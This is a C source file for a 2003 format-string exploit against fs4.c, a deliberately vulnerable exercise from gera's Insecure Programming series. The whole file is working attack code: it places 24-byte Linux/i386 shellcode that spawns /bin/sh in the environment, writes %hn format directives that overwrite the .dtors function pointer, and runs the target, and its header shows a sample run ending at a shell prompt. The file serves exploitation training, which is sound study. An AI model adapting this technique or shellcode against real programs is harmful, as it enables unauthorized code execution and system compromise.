/*
 * $Id: fs4-ex2.c,v 1.1.1.1 2003/10/15 18:25:24 raptor Exp $
 *
 * fs4-ex2.c - fs4.c exploit (gera's Insecure Programming)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * A slightly different approach to fs4.c format string exploitation. This time 
 * we are exploiting the printf() call, overwriting the first function pointer 
 * in .dtors and thus redirecting the program flow. To accomplish this, we 
 * "bypass" the snprintf() 2-bytes write, making it to overwrite a dummy half
 * memory address (in this example we are using the address of .dtors section).
 *
 * See also http://www.0xdeadbeef.info/code/misc-exploits.tgz (fmt section).
 *
 * NOTE. It's also possible to use an hybrid approach, combining the 2 
 * techniques from fs4-ex.c and fs4-ex2.c, to obtain particular results.
 *
 * Buffer structure:
 * [DTORS (4 bytes)] [DTORS + 2 (4 bytes)] [DUMMY (4 bytes)] [write string]
 *
 * $ uname -a
 * Linux karma 2.4.20-rc4 #1 SMP Wed Nov 27 19:21:06 CET 2002 i686 unknown
 * $ gcc --version
 * 2.95.4
 * $ ./fs4-ex2
 * Using .dtors address    : 0x80495a4
 * Using ret address       : 0xbfffffdd
 * Using format string     : ¤¦ %.65489u%6$hn%.49186u%7$hn
 * [...]
 * sh-2.05a$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN	"./fs4"		// this is the vulnerable program
#define	BUF	256 		// max size of the malicious buffer
#define DTORS	0x080495a0 + 4	// address of first pointer in .dtors
#define DUMMY	DTORS - 4	// dummy writable address (we use .dtors)
#define	OFFSET	6		// offset to first address on stack
#define NOP	0x90		// use nops padding

/* split an address in 2 words */
#define SPLITW( w1, w2, addr ) {	\
	w1 = (addr & 0x0000ffff);	\
	w2 = (addr & 0xffff0000) >> 16;	\
}

char sc[] = /* linux/i386 shellcode (24 bytes) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
	char 	buf[BUF];
	char	*p = buf;

	int	n1, n2, offset = OFFSET;
	int	ret1, ret2;

	/* put shellcode in environment */
	char	*envp[2] = {sc, NULL};
	int	ret = 0xbffffffa - strlen(sc) - strlen(VULN);

	/* check command line for offset */
	if (argc > 1)
		offset = atoi(argv[1]);

	/* split the ret address in 2 words */
	SPLITW(ret1, ret2, ret);

	/* initialize the malicious buffer */
	bzero(buf, BUF);

	/* address part of the format string */
	*((void **)p) = (void *)(DTORS);
	p += 4;
	*((void **)p) = (void *)(DTORS + 2);
	p += 4;
	*((void **)p) = (void *)(DUMMY);
	p += 4;

	/* calculate numeric arguments for the write string */
	n1 = (ret1 - strlen(buf))		% 0x10000;
	n2 = (ret2 - strlen(buf) - n1)		% 0x10000;

	/* check for potentially dangerous numeric arguments below 10 */
	n1 += (n1 < 10) ? (0x10000) : (0);
	n2 += (n2 < 10) ? (0x10000) : (0);

	/* build the write string part of the format string */
	sprintf(p, "%%.%du%%%d$hn%%.%du%%%d$hn", n1, offset, n2, offset + 1);

	/* print some output */
	fprintf(stderr, "Using .dtors address\t: %p\n", DTORS);
	fprintf(stderr, "Using ret address\t: %p\n", ret);
	fprintf(stderr, "Using format string\t: %s\n\n", buf);

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, envp);
	perror("execle");
}
